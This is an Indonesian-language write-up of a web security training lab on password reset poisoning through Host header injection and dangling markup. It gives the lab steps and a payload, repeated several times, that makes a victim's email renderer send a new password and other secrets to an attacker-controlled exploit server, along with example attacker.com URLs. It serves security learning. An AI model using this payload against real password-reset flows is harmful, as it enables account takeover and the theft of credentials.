# HTTP Host Header — Password Reset Poisoning via Hanging Markup

## 📖 Konsep

Lab ini memanfaatkan **HTTP Host Header Injection** yang dikombinasikan dengan teknik **Hanging Markup Injection**.

Berbeda dengan Password Reset Poisoning biasa yang mencuri **reset token melalui URL**, pada lab ini **password baru berada di dalam isi email (body email)** sehingga attacker harus membuat parser HTML "menyeret" isi email menjadi bagian dari URL yang mengarah ke server attacker.

Tujuan akhirnya:

- Mengirim email reset password ke Carlos.
- Membuat HTML email menjadi rusak (dangling/hanging markup).
- Membuat browser/email renderer mengirim request ke server attacker.
- Password baru Carlos ikut terbawa di URL sehingga muncul di Access Log.

---

# ⚙️ Cara Kerja

```
POST /forgot-password
        │
        ▼
Host Header dapat dikontrol
        │
        ▼
Host dimasukkan ke HTML Email
        │
        ▼
HTML Email menjadi rusak
        │
        ▼
Atribut href menggantung
(Hanging Markup)
        │
        ▼
Browser / Email Renderer
memproses HTML
        │
        ▼
Request menuju domain attacker
        │
        ▼
Isi email ikut menjadi URL
        │
        ▼
Access Log attacker
berisi password baru
```

---

# 🧠 Root Cause

Server membangun HTML email menggunakan nilai **Host Header** tanpa melakukan escaping.

Contoh:

```html
<a href='https://HOST/login'>
```

Karena Host berasal dari request attacker, HTML dapat dipecahkan.

---

# 🎯 Alur Serangan

1. Login sebagai

```
wiener:peter
```

2. Request reset password akun sendiri.

3. Buka Email Client.

4. Lihat Raw HTML Email.

5. Perhatikan bahwa Host direfleksikan ke dalam atribut HTML.

6. Kirim request berikut.

```
Host:
LAB-ID.web-security-academy.net:'<a href="//EXPLOIT-SERVER/?
```

7. Request reset password kembali.

8. Email menjadi rusak.

9. Bot internal lab merender email.

10. Bot mengirim request ke Exploit Server.

11. Password baru muncul di Access Log.

12. Ganti username menjadi

```
carlos
```

13. Ambil password Carlos.

14. Login sebagai Carlos.

---

# 🎯 Payload

```
Host:

LAB-ID.web-security-academy.net:'<a href="//EXPLOIT-SERVER/?
```

---

# ❓Kenapa Payload Terlihat Rusak?

Karena memang **harus rusak.**

Tujuan payload bukan membuat HTML yang valid.

Tujuannya adalah membuat parser HTML terus membaca karakter setelah payload sehingga isi email ikut menjadi bagian dari URL.

Payload sengaja **tidak ditutup**.

Misalnya

```
<a href="//attacker.com/?
```

Tidak ada

```
">
```

atau

```
'>
```

Karena parser masih menganggap atribut belum selesai.

---

# ❓Kenapa Password Bisa Bocor?

Password **tidak berubah menjadi URL.**

Yang terjadi adalah:

Parser HTML menganggap seluruh karakter setelah payload masih merupakan isi atribut href.

Akibatnya browser membaca URL seperti:

```
https://attacker.com/?/login'>
Your new password:
ABC123
Thank you...
```

Jadi password ikut "terseret" menjadi bagian URL.

---

# ❓Yang Bocor Apakah Hanya Password?

Tidak.

Semua data setelah titik injeksi berpotensi ikut bocor.

Contoh:

```
Your new password
OTP
Verification Code
CSRF Token
API Key
Thank You Message
Email Signature
```

Semuanya dapat ikut menjadi bagian URL.

Password hanyalah data sensitif yang kebetulan berada setelah payload.

---

# ❓Kenapa Tidak Perlu JavaScript?

Karena teknik ini **bukan XSS.**

Tidak ada

```
fetch()
XMLHttpRequest
document.location
script
```

Yang mengirim request adalah browser/email renderer ketika memproses HTML.

---

# ❓Apakah Ada Bot Yang Mengklik?

Tidak.

Yang terjadi pada lab:

Bot internal **merender HTML email**.

Bukan mengklik tombol Login.

Ketika HTML diproses, browser/email renderer mengakses URL attacker sehingga request muncul di Access Log.

---

# ❓Kenapa Request Masuk Ke Log?

Karena browser mengakses

```
attacker.com
```

Server attacker menerima request.

Request tersebut otomatis dicatat pada Access Log.

Walaupun response:

```
200
404
500
```

Access Log tetap mencatat request yang masuk.

Tujuan attacker hanyalah melihat isi request.

---

# ❓Apakah '?' Wajib?

Tidak.

Karena Access Log tetap mencatat request.

Namun penggunaan

```
?
```

membuat payload lebih stabil dan memudahkan parser HTML menyeret karakter setelah payload.

---

# 📚 Yang Membuat Saya Paham

Kesalahan terbesar adalah menganggap:

> Password berubah menjadi URL.

Padahal yang benar:

> Parser HTML menyeret isi email sehingga password ikut menjadi bagian dari URL.

Jadi URL attacker menjadi seperti:

```
https://attacker.com/?/login'>
Your new password
ABC123
```

Password hanyalah bagian dari URL tersebut.

---

# 🌍 Real Target

Password Reset Poisoning biasa jauh lebih sering ditemukan.

Contohnya:

```
Host:

attacker.com
```

Email korban berubah menjadi

```
https://attacker.com/reset?token=xxxxxxxx
```

Korban klik.

Token bocor.

Ini jauh lebih umum dibanding Hanging Markup.

---

# 🌍 Kenapa Hanging Markup Jarang?

Karena harus memenuhi semua syarat berikut.

- Host direfleksikan ke HTML email.
- Tidak dilakukan escaping.
- Email berupa HTML.
- Email Client rentan.
- Ada data sensitif setelah titik injeksi.

Jika satu syarat gagal, exploit gagal.

Karena itulah teknik ini cukup langka.

---

# 🎯 Cara Berpikir Saat Hunting

Jika menemukan:

- Forgot Password
- Verify Email
- Invitation
- Magic Login
- Activation Link

Prioritas pertama:

✅ Apakah Host dipakai membuat URL?

Jika iya:

Coba Password Reset Poisoning biasa.

Jika tidak:

Lihat Raw HTML Email.

Apakah Host masuk ke atribut HTML?

Jika iya:

Barulah pikirkan Hanging Markup.

Jangan langsung mencoba payload Hanging Markup tanpa memahami struktur HTML email.

---

# ⚠️ NOTE

Teknik ini **sangat jarang** ditemukan pada Bug Bounty nyata.

Kebanyakan aplikasi modern:

- Menggunakan domain tetap.
- Melakukan HTML escaping.
- Menggunakan Gmail / Outlook / layanan email modern.
- Tidak membangun HTML email menggunakan Host Header.

Karena itu Password Reset Poisoning klasik jauh lebih realistis.

Lab ini dibuat untuk melatih cara berpikir mengenai parser HTML dan Host Header Injection, bukan karena teknik ini sering ditemukan.

---

# 📚 Pelajaran Lab

- Host Header tidak selalu digunakan untuk Password Reset Poisoning biasa.
- Host juga dapat memecahkan struktur HTML email.
- Parser HTML dapat menyeret isi email menjadi bagian URL.
- Browser/email renderer yang membocorkan data.
- Tidak membutuhkan JavaScript.
- Access Log tetap mencatat request walaupun response 404.
- Yang bocor bukan hanya password tetapi seluruh data setelah payload.

---

# ⚡ Hafalan Cepat

```
Host Injection
        │
        ▼
Host Masuk HTML Email
        │
        ▼
Payload Menggantung
(Hanging Markup)
        │
        ▼
Parser HTML
Menyeret Isi Email
        │
        ▼
Browser Merender Email
        │
        ▼
Request ke Attacker
        │
        ▼
Access Log
        │
        ▼
Password Bocor
```

---

# 🔑 Inti Lab

**Bug Class**

```
HTTP Host Header Injection
+
Hanging Markup Injection
```

**Root Cause**

```
Host Header direfleksikan ke HTML Email tanpa escaping.
```

**Payload**

```
Host:

LAB-ID.web-security-academy.net:'<a href="//EXPLOIT-SERVER/?
```

**Data Bocor**

- Password Baru
- OTP
- Verification Code
- CSRF Token
- API Key
- atau data lain yang berada setelah titik injeksi.

**Real Target**

```
⭐⭐⭐⭐⭐ Password Reset Poisoning biasa (Umum)

⭐ Hanging Markup (Jarang)
```

---

# 🧠 Mindset Hunting

Jangan menghafal payload.

Pahami alurnya.

```
Host Header
        │
        ▼
Dipakai Server Untuk Apa?

        │
        ├── Absolute URL
        │       │
        │       ▼
        │ Password Reset Poisoning
        │
        └── HTML Email
                │
                ▼
        Lihat Source HTML
                │
                ▼
Host Masuk ke Attribute?
                │
                ▼
Ya
                │
                ▼
Pertimbangkan Hanging Markup
```
